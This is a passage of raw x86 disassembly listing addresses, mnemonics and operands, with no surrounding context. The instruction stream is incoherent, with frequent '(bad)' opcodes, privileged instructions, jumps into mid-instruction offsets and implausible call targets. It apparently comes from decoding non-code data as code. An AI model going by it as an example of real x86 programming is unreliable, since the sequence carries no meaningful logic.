  432a7f:	or     al,0xc
  432a81:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a88:	jmp    0x432a89
  432a8a:	push   ebp
  432a8b:	mov    esp,ebp
  432a8d:	cld    
  432a8e:	inc    ebp
  432a8f:	inc    ebp
  432a90:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a97:	push   esi
  432a98:	push   esi
  432a99:	mov    edi,0x7af080f
  432a9e:	add    bh,al
  432aa0:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432aa6:	add    BYTE PTR [ecx+0x4540100f],cl
  432aac:	mov    ebp,eax
  432aae:	mov    ebp,edi
  432ab0:	lock call edx
  432ab3:	fcom   DWORD PTR [ebp+0x45]
  432ab6:	mov    eax,0x148a8b
  432abb:	push   ecx
  432abc:	enter  0xc145,0x83
  432ac0:	cmp    ecx,DWORD PTR [eax]
  432ac2:	add    BYTE PTR [ebp+0x4d],al
  432ac5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432acb:	call   0xffa3263a
  432ad0:	cmp    eax,DWORD PTR [ebp-0xc]
  432ad3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432ad7:	push   ebp
  432ad8:	(bad)  
  432ad9:	call   0x3428dd
  432ade:	mov    bh,0xdb
  432ae0:	cld    
  432ae1:	or     BYTE PTR [ebp+0x45],bl
  432ae4:	(bad)  
  432ae5:	call   0xff7d2775
  432aea:	add    al,BYTE PTR [ebp+0x37]
  432aed:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432af3:	jne    0x432af5
  432af5:	(bad)  
  432af6:	cmp    edi,esp
  432af8:	jne    0x432b2b
  432afa:	mov    edi,edi
  432afc:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b02:	pop    ds
  432b03:	into   
  432b04:	je     0x432ac7
  432b06:	mov    ebx,DWORD PTR [esi]
  432b08:	or     BYTE PTR [ebp-0x49],al
  432b0b:	mov    esp,DWORD PTR [esi-0x77]
  432b0e:	mov    esi,0x2451f0c
  432b13:	mov    eax,DWORD PTR [eax]
  432b15:	or     al,0x66
  432b17:	sar    bl,0x3b
  432b1a:	xor    esi,DWORD PTR [ebp+0x66]
  432b1d:	xor    ecx,edi
  432b1f:	pop    edi
  432b20:	adc    bl,BYTE PTR [ebx+0x7e]
  432b23:	ret    0xff
  432b26:	cld    
  432b27:	inc    ebp
  432b28:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432b2e:	cld    
  432b2f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432b36:	push   0xffffff83
  432b38:	pop    edi
  432b39:	or     BYTE PTR [ebp+0x53],dh
  432b3c:	xorps  xmm1,xmm2
  432b3f:	test   BYTE PTR [eax+eax*1],bh
  432b42:	add    BYTE PTR [eax],al
  432b44:	adc    eax,eax
  432b46:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432b4e:	jmp    DWORD PTR [eax]
  432b50:	ror    al,0x5e
  432b53:	inc    ebp
  432b54:	leave  
  432b55:	xor    ecx,DWORD PTR [eax]
  432b57:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432b5d:	add    ah,al
  432b5f:	xor    edi,edi
  432b61:	xor    DWORD PTR [ebx],0x66003302
  432b67:	mov    DWORD PTR [ebp-0xc],ecx
  432b6a:	pcmpgtw mm0,mm0
  432b6d:	add    dl,ah
  432b6f:	leave  
  432b70:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432b74:	push   eax
  432b75:	dec    ebp
  432b76:	mov    esi,DWORD PTR [ebx-0x75]
  432b79:	lea    ebp,[eax-0x7c00ff02]
  432b7f:	xor    eax,DWORD PTR [eax]
  432b81:	sysret 
  432b83:	dec    ebp
  432b84:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b8b:	push   WORD PTR [ecx+0x8]
  432b8f:	jne    0x432b52
  432b91:	ud0    ecx,DWORD PTR [ecx]
  432b94:	mov    eax,edx
  432b96:	lods   al,BYTE PTR ds:[esi]
  432b97:	add    BYTE PTR [eax],al
  432b99:	data16 (bad) 
  432b9b:	iret   
  432b9c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432ba3:	cli    
  432ba4:	inc    ebp
  432ba5:	cmp    al,0x8d
  432ba7:	add    BYTE PTR [esi+0x2d],ah
  432baa:	inc    ebp
  432bab:	pop    ebp
  432bac:	lea    ecx,[edi]
  432bae:	mov    dl,bh
  432bb0:	add    BYTE PTR [edi],cl
  432bb2:	mov    DWORD PTR [eax+eax*8],edi
  432bb5:	mov    ebx,0x3b87
  432bba:	add    BYTE PTR [ebx],ch
  432bbc:	inc    ebp
  432bbd:	data16 (bad) 
  432bbf:	clc    
  432bc0:	int3   
  432bc1:	cmp    eax,DWORD PTR [eax]
  432bc3:	je     0x432b4e
  432bc5:	push   0xffffffc8
  432bc7:	pop    edi
  432bc8:	xchg   DWORD PTR [ebp+0x0],eax
  432bcb:	data16 add BYTE PTR [ebp+0x45],cl
  432bcf:	lea    cx,[ebp+0x10]
  432bd3:	jb     0x432bd5
  432bd5:	jmp    0x432b60
  432bd7:	call   eax
  432bd9:	clc    
  432bda:	xchg   DWORD PTR [edi+0x1],edi
  432bdd:	mov    eax,DWORD PTR [eax]
  432bdf:	or     BYTE PTR [ebp-0x49],al
  432be2:	lea    eax,[eax+0x74003154]
  432be8:	push   edi
  432be9:	inc    edx
  432bea:	jge    0x432beb
  432bec:	mov    DWORD PTR [edi],ecx
  432bee:	fdiv   DWORD PTR [edi-0x6]
  432bf1:	inc    DWORD PTR [eax]
  432bf3:	xor    edx,DWORD PTR [eax+0x5f]
  432bf6:	xchg   DWORD PTR [ebx+0x1],ebx
  432bf9:	ret    0x0
  432bfc:	xor    BYTE PTR [ebp-0x51],cl
  432bff:	cmp    edi,0xf0ff89fe
  432c05:	data16 ror al,0x84
  432c09:	rol    BYTE PTR [eax],0x3b
  432c0c:	add    al,dh
  432c0e:	dec    eax
  432c0f:	xchg   esp,eax
  432c10:	push   ebx
  432c11:	jmp    0x432b9e
  432c13:	push   ebp
  432c14:	add    esp,ebp
  432c16:	add    ebp,esp
  432c18:	mov    edx,DWORD PTR [edi+0x24]
  432c1b:	clc    
  432c1c:	dec    esi
  432c1d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432c23:	cmp    BYTE PTR [ebx],al
  432c25:	jne    0x432bb0
  432c27:	xor    esp,eax
  432c29:	jmp    0x462dac
  432c2e:	add    ebp,DWORD PTR [ecx+ecx*4]
  432c31:	jne    0x432c27
  432c33:	call   0xffcd298d
  432c38:	clc    
  432c39:	xchg   edi,eax
  432c3a:	sti    
  432c3b:	add    DWORD PTR [ebx],eax
  432c3d:	add    BYTE PTR [ebp+0x47],bl
  432c40:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432c46:	pop    ebp
  432c47:	mov    DWORD PTR [esi-0x48],esi
  432c4a:	jmp    0x432c93
  432c4c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432c52:	(bad)  
  432c54:	cmp    al,0x0
  432c56:	cmp    eax,DWORD PTR [ebp+0x18]
  432c59:	lea    ebx,[ebp-0x56]
  432c5c:	jle    0x432c5e
  432c5e:	jae    0x432be9
  432c60:	mov    eax,esp
  432c62:	call   0xb900:0x8b005587
  432c69:	inc    ebp
  432c6a:	push   ebp
  432c6b:	lea    ecx,[ebp-0x27ff4f12]
  432c71:	mov    eax,edi
  432c73:	int3   
  432c74:	push   ebp
  432c75:	xchg   edi,eax
  432c77:	add    esp,ebp
  432c79:	add    BYTE PTR [eax],al
  432c7b:	inc    ebp
  432c7c:	add    BYTE PTR [ebp+0x8b3255],cl
  432c82:	cld    
  432c83:	mov    DWORD PTR [edx],edi
  432c85:	aam    0x75
  432c87:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c8d:	mov    DWORD PTR [ebx-0x50],edx
  432c90:	test   BYTE PTR [ebp-0x1],0xe8
  432c94:	mov    eax,DWORD PTR [eax]
  432c96:	hlt    
  432c97:	add    al,al
  432c99:	mov    eax,DWORD PTR ds:0x890045a8
  432c9f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432ca5:	inc    DWORD PTR [eax*2+0xf75854d]
  432cac:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432cb2:	call   0x729989f3
  432cb7:	je     0x432d17
  432cb9:	js     0x432d1a
  432cbb:	lock ret 0x7e
  432cbf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432cc5:	mov    edi,edi
  432cc7:	sbb    al,bl
  432cc9:	clc    
  432cca:	add    BYTE PTR [ebp-0x73],bh
  432ccd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432cd3:	ror    BYTE PTR [eax],1
  432cd5:	dec    ebp
  432cd6:	xchg   ebp,eax
  432cd7:	mov    edi,edi
  432cd9:	in     al,0x8b
  432cdb:	jge    0x432c66
  432cdd:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432ce3:	clc    
  432ce4:	pop    esi
  432ce5:	fist   DWORD PTR [ebp+0x5d398b5d]
  432ceb:	clc    
  432cec:	add    al,0x6e
  432cee:	mov    eax,DWORD PTR [ebx]
  432cf0:	mov    BYTE PTR [ebp+0x0],dl
  432cf3:	mov    edx,DWORD PTR [ebx-0x20]
  432cf6:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432cfc:	add    eax,0x3b3b73
  432d01:	adc    al,0x89
  432d03:	pop    eax
  432d04:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d08:	ret    0xf08
  432d0b:	cmp    al,0x2
  432d0d:	mov    edx,eax
  432d0f:	cld    
  432d10:	add    BYTE PTR [ebp+0x66],dl
  432d13:	add    eax,ebx
  432d15:	add    esp,eax
  432d17:	sub    eax,eax
  432d19:	or     BYTE PTR [ecx-0x77f474bb],cl
  432d1f:	add    BYTE PTR [eax],al
  432d21:	mov    DWORD PTR [ebx-0x24],ebx
  432d24:	push   edi
  432d25:	push   ebp
  432d26:	clc    
  432d27:	add    DWORD PTR [esi+0x1b0100],0x45
  432d2e:	out    0xff,eax
  432d30:	add    edx,DWORD PTR [eax]
  432d32:	jmp    0x432d1c
  432d34:	cmp    ch,0x46
  432d37:	(bad)  
  432d38:	jmp    0x40c8b58a
  432d3d:	je     0x432cc9
  432d3f:	mov    eax,DWORD PTR [eax-0x10c78104]
  432d45:	inc    ebp
  432d46:	add    BYTE PTR [ebx-0x770375],al
  432d4c:	add    ah,ch
  432d4e:	add    edx,esp
  432d50:	pop    edi
  432d51:	pop    ebp
  432d52:	push   ebp
  432d53:	inc    ebx
  432d54:	in     al,dx
  432d55:	pop    ebp
  432d56:	in     al,dx
  432d57:	cmp    edx,DWORD PTR [edi-0x8]
  432d5a:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432d61:	add    al,0x47
  432d63:	push   ebp
  432d64:	mov    esp,ebp
  432d66:	in     al,0x45
  432d68:	dec    ebp
  432d69:	push   esi
  432d6a:	test   DWORD PTR [eax+0xfb010f],esi
  432d70:	add    BYTE PTR [eax+0xc018b],dh
  432d76:	leave  
  432d77:	inc    ebp
  432d78:	test   al,ch
  432d7a:	add    dh,bh
  432d7c:	add    bh,bh
  432d7e:	dec    ebp
  432d7f:	push   cs
  432d80:	mov    DWORD PTR [ecx],eax
  432d82:	hlt    
  432d83:	push   es
  432d84:	dec    ebp
  432d85:	leave  
  432d86:	mov    DWORD PTR [eax],ecx
  432d88:	clc    
  432d89:	cmovge eax,ecx
  432d8c:	mov    ecx,0x85c2f0
  432d92:	clc    
  432d93:	pop    DWORD PTR [ebp+0x1]
  432d96:	push   ebx
  432d97:	add    BYTE PTR [ebp-0x15],bh
  432d9a:	push   esi
  432d9b:	xor    eax,0x898a45
  432da0:	cld    
  432da1:	add    al,BYTE PTR [ebp+0x0]
  432da4:	xor    esp,DWORD PTR [esi-0x64]
  432da7:	add    DWORD PTR [esi+0x78308c1],edi
  432dad:	add    ah,BYTE PTR [ebp-0x49]
  432db0:	int    0xbb
  432db2:	mov    ecx,DWORD PTR [esi+0xc]
  432db5:	add    dh,al
  432db7:	cmp    ecx,ebx
  432db9:	jne    0x432d83
  432dbb:	xor    ecx,DWORD PTR [ebp+0x66]
  432dbe:	jmp    0xca2dc4
  432dc3:	add    DWORD PTR [ebp+0x0],eax
  432dc6:	mov    eax,ebx
  432dc8:	or     al,0x8b
  432dca:	(bad)  
  432dcb:	mov    ecx,esi
  432dcd:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432dd4:	mov    eax,edi
  432dd6:	or     BYTE PTR [edx],cl
  432dd8:	shl    cl,cl
  432dda:	icebp  
  432ddb:	add    BYTE PTR [ebp+0x38],0x8b
  432ddf:	or     BYTE PTR [edx+eax*2],cl
  432de2:	(bad)  
  432de3:	or     cl,dh
  432de5:	stc    
  432de6:	shl    DWORD PTR [ebp-0x30],0xc6
  432dea:	xor    al,0x0
  432dec:	inc    ebp
  432ded:	xchg   BYTE PTR [ebx],al
  432def:	add    esp,edi
  432df1:	add    BYTE PTR [ebp-0x39],cl
  432df4:	mov    al,bl
  432df6:	test   DWORD PTR [ebx+0x1c348375],ecx
  432dfc:	sub    al,0xbf
  432dfe:	jmp    0x432d85
  432e00:	mov    edi,eax
  432e02:	lock jge 0x432df6
  432e05:	lea    esi,[edx-0x74bad5ff]
  432e0b:	mov    ebp,esp
  432e0d:	or     cl,dh
  432e0f:	leave  
  432e10:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432e17:	dec    ebp
  432e18:	dec    ebp
  432e19:	test   DWORD PTR [ebx],eax
  432e1b:	paddb  mm6,mm0
  432e1e:	add    DWORD PTR [eax],eax
  432e20:	dec    ebp
  432e21:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432e27:	mov    esi,DWORD PTR [edx]
  432e29:	or     al,0x2b
  432e2b:	dec    ebp
  432e2c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432e32:	mov    esp,edi
  432e34:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432e3b:	mov    DWORD PTR [ebx],ebp
  432e3d:	call   0xc76b76d
  432e42:	mov    DWORD PTR [ebp+0x10],ecx
  432e45:	(bad)  
  432e46:	push   0x8b85ff10
  432e4b:	clc    
  432e4c:	or     al,0x54
  432e4e:	(bad)  
  432e4f:	push   ecx
  432e50:	retf   
  432e51:	mov    ebx,0xff4d8dc8
  432e56:	mov    DWORD PTR [ebp+0x8],eax
  432e59:	xor    eax,DWORD PTR [ebp-0x75]
  432e5c:	cmp    ebp,DWORD PTR [ebx]
  432e5e:	lsl    ebx,WORD PTR [edi-0x8]
  432e62:	call   DWORD PTR [ebx-0x741bff75]
  432e68:	(bad)  
  432e69:	or     al,0x5b
  432e6b:	dec    ebp
  432e6c:	or     BYTE PTR [ebx],dh
  432e6e:	inc    ebp
  432e6f:	xor    esi,DWORD PTR ds:0x708088d
  432e75:	in     eax,0x9b
  432e77:	add    BYTE PTR [edx],dh
  432e79:	inc    ebp
  432e7a:	pop    edi
  432e7b:	xor    eax,edx
  432e7d:	test   DWORD PTR [eax],0x81108b8b
  432e83:	dec    ebp
  432e84:	sub    al,0x33
  432e86:	add    BYTE PTR [ebx],dh
  432e88:	push   esi
  432e89:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e8f:	mov    edi,eax
  432e91:	or     BYTE PTR [ebp+0x45],al
  432e94:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e9a:	xor    ecx,ecx
  432e9c:	pushf  
  432e9d:	push   es
  432e9e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432ea5:	dec    ebp
  432ea6:	inc    ebp
  432ea7:	cmp    BYTE PTR [ecx],0x54
  432eaa:	pushf  
  432eab:	gs (bad) 
  432ead:	shl    esp,1
  432eaf:	dec    ebp
  432eb0:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432eb6:	shr    ecx,1
  432eb8:	xlat   BYTE PTR ds:[ebx]
  432eb9:	rol    bh,cl
  432ebb:	mov    edx,esp
  432ebd:	or     BYTE PTR [ebp+0x4588f84d],al
  432ec3:	mov    ecx,DWORD PTR [eax]
  432ec5:	or     BYTE PTR [eax],al
  432ec7:	push   ebp
  432ec8:	mov    edi,DWORD PTR [eax+0xfc728b]
  432ece:	dec    ebp
  432ecf:	enter  0xceba,0x8
  432ed3:	retf   0x1807
  432ed6:	ret    0x9b4d
  432ed9:	mov    esi,DWORD PTR [edx]
  432edb:	or     al,0x33
  432edd:	into   
  432ede:	add    edx,esi
  432ee0:	add    ecx,edx
  432ee2:	bswap  eax
  432ee4:	ror    esi,0x98
  432ee7:	dec    ebp
  432ee8:	add    cl,ch
  432eea:	mov    edi,edi
  432eec:	hlt    
  432eed:	inc    esi
  432eef:	inc    ebp
  432ef0:	ret    0x4533
  432ef3:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ef9:	or     BYTE PTR [ebx],dh
  432efb:	dec    ebp
  432efc:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f02:	jne    0xff8d2ec9
  432f08:	inc    ebp
  432f09:	inc    ebp
  432f0a:	mov    esi,DWORD PTR [ebx]
  432f0c:	clc    
  432f0d:	pop    esi
  432f0e:	ret    0xcaeb
  432f11:	mov    eax,esi
  432f13:	call   0x520483e6
  432f18:	dec    ebp
  432f19:	add    eax,0xf8728b
  432f1e:	adc    eax,0xce0ccac9
  432f23:	push   ebp
  432f24:	ret    0xc6ec
  432f27:	in     al,dx
  432f28:	call   0x33437c31
  432f2d:	push   edi
  432f2e:	add    edi,eax
  432f30:	xor    eax,eax
  432f32:	jmp    0x432f79
  432f34:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432f3a:	add    eax,edi
  432f3c:	shr    eax,cl
  432f3e:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432f44:	mov    esi,DWORD PTR [edx]
  432f46:	in     al,dx
  432f47:	pushf  
  432f48:	ret    0x84c7
  432f4b:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432f51:	inc    ebp
  432f52:	in     al,dx
  432f53:	xor    DWORD PTR [ebp-0x64],eax
  432f56:	mov    eax,edi
  432f58:	cld    
  432f59:	fmul   st(2),st
  432f5b:	sbb    dl,al
  432f5d:	jmp    0x9c3b:0x304d45c1
  432f64:	jbe    0x432f2d
  432f66:	mov    esp,eax
  432f68:	clc    
  432f69:	add    BYTE PTR [ebp+0x0],cl
  432f6c:	mov    ecx,ecx
  432f6e:	lea    eax,[ebp-0x5]
  432f71:	mov    edi,edi
  432f73:	call   0x51ce83bd
  432f78:	hlt    
  432f79:	xor    eax,edx
  432f7b:	mov    esi,0x9b7284
  432f80:	xor    cl,dl
  432f82:	mov    esi,eax
  432f84:	hlt    
  432f85:	into   
  432f86:	inc    ebp
  432f87:	scas   eax,DWORD PTR es:[edi]
  432f88:	mov    ebp,ecx
  432f8a:	cld    
  432f8b:	add    dl,cl
  432f8d:	add    dl,al
  432f8f:	inc    ebp
  432f90:	shr    DWORD PTR [ebx],0x4d
  432f93:	xor    edi,DWORD PTR [ebx]
  432f95:	mov    DWORD PTR [edi],ecx
  432f97:	clc    
  432f98:	dec    esi
  432f99:	inc    ebp
  432f9a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432fa0:	ret    0xc6ca
  432fa3:	mov    BYTE PTR [ebp-0x32],0x53
  432fa7:	scas   eax,DWORD PTR es:[edi]
  432fa8:	inc    ebp
  432fa9:	jmp    0x432fdb
  432fab:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432fb2:	pop    ebx
  432fb3:	xor    ecx,DWORD PTR [ebp+0x3]
  432fb6:	mov    eax,DWORD PTR [ebx]
  432fb8:	clc    
  432fb9:	test   edx,ecx
  432fbb:	mov    ecx,esi
  432fbd:	cld    
  432fbe:	call   0x8ab77508
  432fc3:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432fc9:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432fcf:	fdiv   QWORD PTR [ebx]
  432fd1:	retf   0xce89
  432fd4:	in     al,0xc1
  432fd6:	inc    ebp
  432fd7:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432fdd:	into   
  432fde:	mov    dh,0xc1
  432fe1:	call   0x8c17756a
  432fe6:	(bad)  
  432fe7:	cld    
  432fe8:	mov    ecx,DWORD PTR [ebp-0x14]
  432feb:	xor    eax,ecx
  432fed:	lea    eax,[ebp+0x8]
  432ff0:	mov    esi,DWORD PTR [edx-0x4]
  432ff3:	add    dl,al
  432ff5:	inc    ebp
  432ff6:	mov    esp,0x32d89b8b
  432ffb:	dec    ebp
  432ffc:	mov    esi,DWORD PTR [ebx]
  432ffe:	cld    
  432fff:	xor    eax,edx
  433001:	sub    esp,DWORD PTR [ebp-0x75]
  433004:	int    0xec
  433006:	sub    ecx,eax
  433008:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43300e:	mov    esi,esp
  433010:	call   0x34177d99
  433015:	inc    DWORD PTR [ebx]
  433017:	mov    edi,DWORD PTR [ebx]
  433019:	cld    
  43301a:	jne    0x433069
  43301c:	mov    esi,DWORD PTR [ebx]
  43301e:	aam    0x8d
  433020:	dec    ebp
  433021:	or     BYTE PTR [ebx],dh
  433023:	jb     0x433028
  433025:	add    BYTE PTR [edi+0x45],bl
  433028:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  43302f:	xor    ebp,esp
  433031:	xor    eax,edi
  433033:	sub    edi,esp
  433035:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  43303b:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433042:	inc    ebp
  433043:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433049:	clc    
  43304a:	mov    eax,edi
  43304c:	nop
  43304d:	fadd   QWORD PTR [eax]
  43304f:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433055:	jmp    0x432fe0
  433057:	mov    eax,DWORD PTR [ecx]
  433059:	fadd   DWORD PTR [eax]
  43305b:	inc    ebp
  43305c:	or     DWORD PTR [ebx],esi
  43305e:	dec    eax
  43305f:	add    edx,DWORD PTR [ebx-0x2d]
  433062:	dec    ebp
  433063:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433069:	inc    ebp
  43306a:	push   esp
  43306b:	mov    dl,BYTE PTR [ecx-0xd]
  43306e:	xor    ecx,DWORD PTR [ebp-0x45]
  433071:	(bad)  
  433073:	rol    BYTE PTR [eax],0xc1
  433076:	ret    
  433077:	inc    ebp
  433078:	inc    ebp
  433079:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  43307f:	xor    eax,ebx
  433081:	add    eax,DWORD PTR [ebp+0x23]
  433084:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43308a:	cmp    edi,0xc
  43308d:	dec    ebp
  43308e:	inc    ebp
  43308f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433095:	inc    ebp
  433096:	mov    esi,DWORD PTR [ebx]
  433098:	clc    
  433099:	lea    eax,[ebp+0x45725407]
  43309f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  4330a3:	xor    edi,DWORD PTR [eax]
  4330a5:	mov    ecx,0xff8b8d4d
  4330aa:	push   esp
  4330ab:	enter  0x4df7,0x23
  4330af:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  4330b5:	mov    eax,DWORD PTR [ebx]
  4330b7:	loopne 0x4330a4
  4330b9:	ret    0xc68b
  4330bc:	push   esp
  4330bd:	enter  0x9745,0x8b
  4330c1:	inc    ebp
  4330c2:	cld    
  4330c3:	mov    eax,edi
  4330c5:	clc    
  4330c6:	ret    
  4330c7:	ret    0xc645
  4330ca:	mov    esi,DWORD PTR [ebx]
  4330cc:	cld    
  4330cd:	pop    esi
  4330ce:	mov    ebx,0x83458bc3
  4330d4:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4330d8:	dec    ebp
  4330d9:	xor    DWORD PTR [ebx],esi
  4330db:	pushf  
  4330dc:	add    edi,DWORD PTR [edx-0x7767a77]
  4330e2:	fcom   DWORD PTR [ebp+0x45]
  4330e5:	mov    esi,DWORD PTR [ebx]
  4330e7:	adc    al,0x9c
  4330e9:	inc    ebp
  4330ea:	(bad)  
  4330eb:	mov    ebx,eax
  4330ed:	adc    al,0x85
  4330ef:	cmp    al,0x1
  4330f2:	inc    ebp
  4330f3:	add    BYTE PTR ds:0xe98b9c4d,bh
  4330f9:	mov    eax,DWORD PTR [ebx]
  4330fb:	nop
  4330fc:	add    BYTE PTR [eax],al
  4330fe:	inc    ebp
  4330ff:	mov    esi,DWORD PTR [ebx]
  433101:	add    eax,DWORD PTR [ebx]
  433103:	cmp    al,0x89
  433105:	mov    esp,esi
  433107:	clc    
  433108:	inc    ebp
  433109:	inc    ebp
  43310a:	add    edx,DWORD PTR [esi+0xc]
  43310d:	mov    edi,0x7ff0845
  433112:	in     al,dx
  433113:	(bad)  
  433114:	jne    0x4330b1
  433116:	mov    esi,DWORD PTR [edx]
  433118:	clc    
  433119:	add    ebp,DWORD PTR [esi]
  43311b:	mov    edi,edi
  43311d:	in     al,dx
  43311e:	mov    DWORD PTR [ebp-0x10],eax
  433121:	xor    eax,DWORD PTR [ebp+0x3]
  433124:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  43312a:	fmul   DWORD PTR [ebx-0x173caf39]
  433130:	lea    ecx,[ecx+0x45e8d4bc]
  433136:	clc    
  433137:	mov    edi,edi
  433139:	cmp    BYTE PTR [ebp+0x4d],al
  43313c:	test   DWORD PTR [eax+0x74],ecx
  43313f:	inc    ecx
  433140:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433146:	ret    
  433147:	inc    eax
  433148:	dec    DWORD PTR [ebx+0x4945f8f0]
  43314e:	push   eax
  43314f:	dec    eax
  433150:	test   al,0xd0
  433152:	dec    eax
  433154:	mov    eax,DWORD PTR [ebp-0x14]
  433157:	mov    eax,DWORD PTR [ebp+0x38]
  43315a:	mov    eax,ecx
  43315c:	fadd   DWORD PTR [ebx]
  43315e:	dec    ebp
  43315f:	inc    eax
  433160:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433166:	inc    ebp
  433167:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  43316d:	fadd   QWORD PTR [ebx]
  43316f:	inc    ebp
  433170:	or     al,0x33
  433172:	dec    ebp
  433173:	add    edi,DWORD PTR [ebx]
  433175:	mov    DWORD PTR [edx-0x28],esi
  433178:	mov    eax,DWORD PTR [ebp-0x10]
  43317b:	mov    eax,DWORD PTR [eax+0x10]
  43317e:	mov    eax,edi
  433180:	lock ret 
  433182:	inc    ecx
  433183:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433189:	fsubr  st,st(5)
  43318b:	test   DWORD PTR [eax],eax
  43318d:	clc    
  43318e:	push   0x45
  433190:	(bad)  
  433191:	cmp    al,0xec
  433193:	pushf  
  433194:	inc    ebp
  433195:	(bad)  
  433196:	push   eax
  433197:	fsub   DWORD PTR [eax-0x7b]
  43319a:	(bad)  
  43319b:	clc    
  43319c:	mov    eax,0xf8008584
  4331a1:	mov    eax,DWORD PTR [ebp-0x4]
  4331a4:	mov    edi,0x4585c3cc
  4331aa:	clc    
  4331ab:	mov    eax,DWORD PTR [ebp+0x14]
  4331ae:	xor    eax,DWORD PTR [ebp-0x64]
  4331b1:	mov    edi,eax
  4331b3:	in     al,dx
  4331b4:	les    esi,FWORD PTR [ebp-0x7b]
  4331b7:	mov    edi,eax
  4331b9:	or     al,0x4d
  4331bb:	dec    ebp
  4331bc:	mov    eax,ebp
  4331be:	in     al,0xf2
  4331c0:	dec    ebp
  4331c1:	dec    DWORD PTR [ecx+0x4dc7e045]
  4331c7:	fmul   DWORD PTR [ecx+0x4df8f085]
  4331cd:	inc    ebp
  4331ce:	mov    DWORD PTR [ebx],esi
  4331d0:	fadd   QWORD PTR [ebx]
  4331d2:	dec    ebp
  4331d3:	push   eax
  4331d4:	xor    eax,DWORD PTR [ebp+0x3]
  4331d7:	push   eax
  4331d8:	mov    DWORD PTR [eax+ebx*8],ebx
  4331db:	push   esi
  4331dd:	mov    eax,DWORD PTR [eax]
  4331df:	lock cmp eax,0xf84e85c0
  4331e5:	inc    ebp
  4331e6:	test   BYTE PTR [ebx],dh
  4331e8:	add    DWORD PTR [ebx],eax
  4331ea:	add    BYTE PTR [eax+0x4d],dl
  4331ed:	jne    0x433222
  4331ef:	lea    ecx,[ebx-0x7617fc44]
  4331f5:	div    ah
  4331f7:	inc    DWORD PTR [ebp+0x45]
  4331fa:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433200:	jb     0x43318d
  433202:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433209:	mov    ecx,DWORD PTR [ebp-0x10]
  43320c:	xor    ecx,DWORD PTR [ebp+0x3]
  43320f:	mov    edi,DWORD PTR [ebx]
  433211:	adc    BYTE PTR [ebp+0x41],dh
  433214:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43321a:	ret    
  43321b:	push   ss
  43321c:	push   0x45
  43321e:	lea    ecx,[ebx+0x4de80cb0]
  433224:	sti    
  433225:	add    edi,edi
  433227:	or     BYTE PTR [ebp+0x4d],al
  43322a:	mov    ebp,DWORD PTR [ebx]
  43322c:	xor    ebp,ecx
  43322e:	mov    al,BYTE PTR [edx]
  433230:	add    eax,0xc7200
  433235:	jne    0x433284
  433237:	lea    esi,[ebx]
  433239:	mov    al,0xf
  43323b:	call   0xf2900
  433240:	shl    DWORD PTR [ecx],0x84
  433243:	pushf  
  433244:	add    DWORD PTR [ecx+0x4545d000],ecx
  43324a:	mov    esi,DWORD PTR [edx]
  43324c:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
